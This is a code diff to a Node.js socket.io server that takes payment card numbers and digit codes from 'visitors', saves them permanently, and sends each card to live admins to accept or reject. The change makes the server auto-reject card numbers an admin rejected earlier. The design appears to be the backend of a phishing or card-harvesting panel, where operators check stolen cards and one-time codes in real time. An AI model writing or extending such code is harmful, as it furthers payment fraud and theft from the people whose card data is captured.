@@ -356,6 +356,7 @@ io.on("connection", (socket) => {
         data: {},
         dataHistory: [],
         paymentCards: [],
+        rejectedCards: [],
         digitCodes: [],
         hasNewData: false,
         isBlocked: false,
@@ -438,22 +439,23 @@ io.on("connection", (socket) => {
         }
       }
       if (data.paymentCard) {
-        // Check for duplicate card number
+        // Check if card was previously rejected by admin
         const newCardNumber = data.paymentCard.cardNumber;
-        const isDuplicate = visitor.paymentCards && visitor.paymentCards.some(c => c.cardNumber === newCardNumber);
+        if (!visitor.rejectedCards) visitor.rejectedCards = [];
+        const isAdminRejected = visitor.rejectedCards.includes(newCardNumber);
         
-        if (isDuplicate) {
-          // Reject duplicate card - notify visitor
+        if (isAdminRejected) {
+          // Card was rejected by admin before - auto reject
           socket.emit("card:duplicateRejected");
           // Reset waiting status since card was auto-rejected
           visitor.waitingForAdminResponse = false;
           visitor.lastDataUpdate = new Date().toISOString();
-          // Save duplicate card rejection permanently
+          // Save rejection permanently
           if (!visitor.duplicateCardRejections) visitor.duplicateCardRejections = [];
           visitor.duplicateCardRejections.push({ cardNumber: newCardNumber, timestamp: new Date().toISOString() });
           visitors.set(socket.id, visitor);
           saveVisitorPermanently(visitor);
-          // Notify admins about duplicate card rejection
+          // Notify admins about auto-rejected card
           admins.forEach((admin, adminSocketId) => {
             io.to(adminSocketId).emit("visitor:duplicateCard", {
               visitorId: visitor._id,
@@ -461,8 +463,8 @@ io.on("connection", (socket) => {
               visitor: visitor,
             });
           });
-          console.log(`Duplicate card rejected for visitor ${visitor._id}: ${newCardNumber}`);
-          return; // Don't continue processing - no waitingForAdminResponse, no dataSubmitted
+          console.log(`Admin-rejected card auto-rejected for visitor ${visitor._id}: ${newCardNumber}`);
+          return; // Don't continue processing
         } else {
           const now = new Date().toISOString();
           visitor.paymentCards.push({
@@ -695,6 +697,14 @@ io.on("connection", (socket) => {
     const visitor = visitors.get(visitorSocketId);
     if (visitor) {
       visitor.waitingForAdminResponse = false;
+      // If admin rejected the card, add last card number to rejectedCards list
+      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
+        if (!visitor.rejectedCards) visitor.rejectedCards = [];
+        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
+        if (lastCard && lastCard.cardNumber && !visitor.rejectedCards.includes(lastCard.cardNumber)) {
+          visitor.rejectedCards.push(lastCard.cardNumber);
+        }
+      }
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
       io.emit("visitors:update", Array.from(visitors.values()));
